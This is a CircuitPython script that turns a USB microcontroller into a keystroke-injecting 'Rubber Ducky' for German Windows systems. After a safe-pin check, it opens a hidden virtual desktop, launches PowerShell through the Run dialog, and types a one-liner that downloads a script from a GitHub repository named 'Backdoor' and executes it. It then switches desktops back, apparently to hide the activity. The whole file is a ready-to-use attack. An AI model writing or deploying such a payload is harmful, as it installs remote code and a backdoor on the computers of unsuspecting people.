#Logik für "Entschärfen" des Sticks
import board
import digitalio
import sys

#Gleiche Pin Abfrage wie in boot.py
safe_pin = digitalio.DigitalInOut(board.GP0)
safe_pin.direction = digitalio.Direction.INPUT
safe_pin.pull = digitalio.Pull.UP

#Wenn Pin1 gegen GND (PIN3) geschlossen ist, beende das Script sofort
if not safe_pin.value:
	print("Skrip beendet")
	sys.exit()

#######################################################################################
# Ruber Ducky Logik
import usb_hid
import time
from adafruit_hid.keyboard import Keyboard
from keycode_win_de import Keycode
from keyboard_layout_win_de import KeyboardLayout


# Tastatur initialisieren (Achten Sie auf das große 'K' bei Keyboard und 'devices' mit 's')
kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayout(kbd)

# 5 Sekunden warten, bis der PC das USB-Gerät bereitgestellt hat
time.sleep(1.5)


befehl = "iwr -useb https://raw.githubusercontent.com/KibaYuuto/Backdoor/main/run.ps1 | iex"


kbd.press(Keycode.GUI, Keycode.CONTROL, Keycode.D)
kbd.release_all()
time.sleep(0.1)
kbd.press(Keycode.GUI, Keycode.R)
kbd.release_all()
time.sleep(0.8)

layout.write("powershell")
kbd.send(Keycode.ENTER)

time.sleep(0.8)

layout.write(befehl)

time.sleep(0.1)
kbd.send(Keycode.ENTER)

time.sleep(0.2)

kbd.press(Keycode.GUI, Keycode.CONTROL, Keycode.LEFT_ARROW)
time.sleep(2)
kbd.release_all()



